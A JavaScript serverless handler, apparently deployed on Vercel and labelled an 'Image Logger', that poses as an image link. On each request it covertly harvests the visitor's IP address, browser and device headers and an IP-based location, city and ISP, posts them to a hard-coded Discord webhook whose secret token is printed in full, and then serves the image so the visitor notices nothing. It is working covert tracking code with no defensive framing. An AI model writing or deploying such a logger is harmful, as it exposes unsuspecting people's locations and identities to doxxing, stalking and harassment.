import https from 'https';

// ─── CHANGE THIS IMAGE URL ANYTIME ───
const IMAGE_URL = 'https://cdn.discordapp.com/attachments/1522326026577772655/1533994113081413753/v1c044g50000d9lrmivog65kaclgt54g.mov?ex=6a7282d8&is=6a713158&hm=309705a0f0a44e3d4e00e0fd7d3a15aedeab6fec134d295b58075e46af842123&';
// ─────────────────────────────────────

export default async function handler(req, res) {
    // ─── Get all available info ───
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
               req.socket.remoteAddress || 
               'unknown';
    
    const ua = req.headers['user-agent'] || 'unknown';
    const referer = req.headers['referer'] || 'none';
    const acceptLang = req.headers['accept-language'] || 'unknown';
    const acceptEncoding = req.headers['accept-encoding'] || 'unknown';
    const secChUa = req.headers['sec-ch-ua'] || 'unknown';
    const secChUaPlatform = req.headers['sec-ch-ua-platform'] || 'unknown';
    const secChUaMobile = req.headers['sec-ch-ua-mobile'] || 'unknown';
    const dnt = req.headers['dnt'] || 'unknown';
    const time = new Date().toISOString().replace('T', ' ').slice(0, 19);

    // ─── Get country from IP using free API (with fallback) ───
    let country = 'Unknown';
    let countryCode = 'UN';
    let flagEmoji = '🌍';
    let city = 'Unknown';
    let region = 'Unknown';
    let isp = 'Unknown';
    let org = 'Unknown';
    let timezone = 'Unknown';
    let loc = 'Unknown';
    let asn = 'Unknown';

    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,timezone,loc,as`);
        if (geoRes.ok) {
            const geo = await geoRes.json();
            if (geo.status === 'success') {
                country = geo.country || 'Unknown';
                countryCode = geo.countryCode || 'UN';
                city = geo.city || 'Unknown';
                region = geo.regionName || 'Unknown';
                isp = geo.isp || 'Unknown';
                org = geo.org || 'Unknown';
                timezone = geo.timezone || 'Unknown';
                loc = geo.loc || 'Unknown';
                asn = geo.as || 'Unknown';
                // Convert country code to flag emoji
                const codePoints = countryCode.toUpperCase().split('').map(ch => 0x1F1E6 + ch.charCodeAt(0) - 65);
                flagEmoji = String.fromCodePoint(...codePoints);
            }
        }
    } catch (_) { /* fallback to defaults */ }

    // ─── Parse User-Agent for device info ───
    let deviceType = 'Unknown';
    let os = 'Unknown';
    let browser = 'Unknown';

    if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac OS')) os = 'macOS';
    else if (ua.includes('Linux')) os = 'Linux';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
    else if (ua.includes('Chrome OS')) os = 'ChromeOS';
    else if (ua.includes('Ubuntu')) os = 'Ubuntu';
    else os = 'Other';

    if (ua.includes('Mobile') || ua.includes('Android') && !ua.includes('Tablet')) deviceType = 'Mobile Phone';
    else if (ua.includes('Tablet') || ua.includes('iPad')) deviceType = 'Tablet';
    else if (ua.includes('Windows') || ua.includes('Mac') || ua.includes('Linux')) deviceType = 'Desktop';
    else deviceType = 'Unknown';

    if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
    else if (ua.includes('Brave')) browser = 'Brave';
    else browser = 'Other';

    // ─── Build rich embed ───
    const embed = {
        title: '🕵️ New Click Captured',
        color: 0x00ff88,
        thumbnail: { url: IMAGE_URL },
        fields: [
            { name: '🌐 IP Address', value: `\`${ip}\``, inline: false },
            { name: `${flagEmoji} Country`, value: `${country} (${countryCode})`, inline: true },
            { name: '📍 Region / City', value: `${region} / ${city}`, inline: true },
            { name: '🗺️ Location (lat,lon)', value: `\`${loc}\``, inline: false },
            { name: '⏰ Timezone', value: timezone, inline: true },
            { name: '🏢 ISP / Organization', value: `${isp}\n${org}`, inline: true },
            { name: '🔢 ASN', value: asn, inline: true },
            { name: '🖥️ Device Type', value: deviceType, inline: true },
            { name: '💻 OS', value: os, inline: true },
            { name: '🌐 Browser', value: browser, inline: true },
            { name: '📱 Mobile', value: secChUaMobile || 'unknown', inline: true },
            { name: '📋 Platform (sec-ch-ua)', value: secChUaPlatform || 'unknown', inline: true },
            { name: '📎 User-Agent', value: `\`${ua.slice(0, 200)}${ua.length > 200 ? '...' : ''}\``, inline: false },
            { name: '🔗 Referer', value: referer.length > 100 ? referer.slice(0, 100) + '...' : referer, inline: false },
            { name: '🌍 Accept-Language', value: acceptLang, inline: true },
            { name: '⚙️ Accept-Encoding', value: acceptEncoding, inline: true },
            { name: '🚫 Do Not Track', value: dnt, inline: true },
            { name: '📅 Timestamp (UTC)', value: `\`${time}\``, inline: false }
        ],
        footer: { text: 'Image Logger • Powered by Vercel', icon_url: 'https://cdn.discordapp.com/emojis/1275000930538225665.png' }
    };

    // ─── Send to Discord webhook ───
    const webhook = 'https://discord.com/api/webhooks/1532494338477785189/piKPDYGbTysmL3tPK_HQckufpf28oSRKvUAGkt5aHA2EiSyGAMZyOphc464WIJA20Atr';
    const payload = JSON.stringify({ embeds: [embed] });
    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };
    const discordReq = https.request(webhook, options, () => {});
    discordReq.write(payload);
    discordReq.end();

    // ─── Serve the image ───
    try {
        const imageRes = await fetch(IMAGE_URL);
        const buffer = Buffer.from(await imageRes.arrayBuffer());
        res.setHeader('Content-Type', 'image/png');
        res.status(200).send(buffer);
    } catch (_) {
        // Fallback if image fails – send a simple 1x1 transparent PNG
        const fallbackBuffer = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
        res.setHeader('Content-Type', 'image/png');
        res.status(200).send(fallbackBuffer);
    }
}
